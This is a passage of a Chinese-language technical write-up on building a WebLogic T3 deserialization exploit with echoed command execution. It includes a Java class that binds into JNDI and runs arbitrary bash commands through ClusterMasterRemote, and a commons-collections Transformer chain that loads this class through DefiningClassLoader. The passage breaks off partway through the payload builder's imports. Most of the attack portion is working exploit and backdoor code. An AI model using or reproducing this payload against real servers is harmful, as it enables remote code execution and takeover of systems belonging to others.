  3. common-collection构造的问题
因为ClassLoader是一个abstract，所以我们只能从他的子类中寻找defineClass()，idea快捷键CTRL alt
b可以寻找子类，我找到了以下几个
    jxxload_help.PathVFSJavaLoader#loadClassFromBytes
    org.python.core.BytecodeLoader1#loadClassFromBytes
    sun.org.mozilla.javascript.internal.DefiningClassLoader#defineClass
    java.security.SecureClassLoader#defineClass(java.lang.String, byte[], int, int, java.security.CodeSource)
    org.mozilla.classfile.DefiningClassLoader#defineClass
这几个的defineClass()没有做检查，可以直接定义类。weblogic_cmd用的是最后一个。
然后我们再来看应该实现哪个RMI接口，可以直接在Remote类按快捷键寻找，378个......
注意我们要找的是interface，并且我们要返回命令执行的结果，所以方法的返回类型应该为String，并且方法必须抛出
java.rmi.RemoteException 异常。
随便找了几个
    weblogic.ejb.QueryHome
    weblogic.ejb20.interfaces.RemoteHome#getIsIdenticalKey
    weblogic.jndi.internal.NamingNode#getNameInNamespace(java.lang.String)
    weblogic.cluster.singleton.ClusterMasterRemote
weblogic_cmd用的就是最后一个，我们也用最后一个来构造
    package com.test.payload;
    import weblogic.cluster.singleton.ClusterMasterRemote;
    import javax.naming.Context;
    import javax.naming.InitialContext;
    import javax.naming.NamingException;
    import java.io.BufferedReader;
    import java.io.InputStreamReader;
    import java.rmi.RemoteException;
    import java.util.ArrayList;
    import java.util.List;
    public class RemoteImpl implements ClusterMasterRemote {
        public static void main(String[] args) {
            RemoteImpl remote = new RemoteImpl();
            try {
                Context context = new InitialContext();
                context.rebind("Y4er",remote);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        @Override
        public void setServerLocation(String cmd, String args) throws RemoteException {
        }
        @Override
        public String getServerLocation(String cmd) throws RemoteException {
            try {
                List cmds = new ArrayList();
                cmds.add("/bin/bash");
                cmds.add("-c");
                cmds.add(cmd);
                ProcessBuilder processBuilder = new ProcessBuilder(cmds);
                processBuilder.redirectErrorStream(true);
                Process proc = processBuilder.start();
                BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
                StringBuffer sb = new StringBuffer();
                String line;
                while ((line = br.readLine()) != null) {
                    sb.append(line).append("\n");
                }
                return sb.toString();
            } catch (Exception e) {
                return e.getMessage();
            }
        }
    }
最后一个问题就是common-collection的transform[]构造的问题，我们要通过反射的形式调用DefiningClassLoader的defineClass()去定义我们自己的类，然后还是反射调用自己类的main方法。也就是如下。
    // common-collection1 构造transformers 定义自己的RMI接口
    Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(DefiningClassLoader.class),
        new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
        new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
        new InvokerTransformer("defineClass",
                               new Class[]{String.class, byte[].class}, new Object[]{className, clsData}),
        new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"main", new Class[]{String[].class}}),
        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{}}),
        new ConstantTransformer(new HashSet())};
接下来将我们自己写好的RMI接口类生成字节码之后构造payload
    package com.test;
    import com.supeream.serial.Reflections;
    import com.supeream.serial.SerialDataGenerator;
    import com.supeream.serial.Serializables;
    import com.supeream.ssl.WeblogicTrustManager;
    import com.supeream.weblogic.T3ProtocolOperation;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.LazyMap;
    import org.mozilla.classfile.DefiningClassLoader;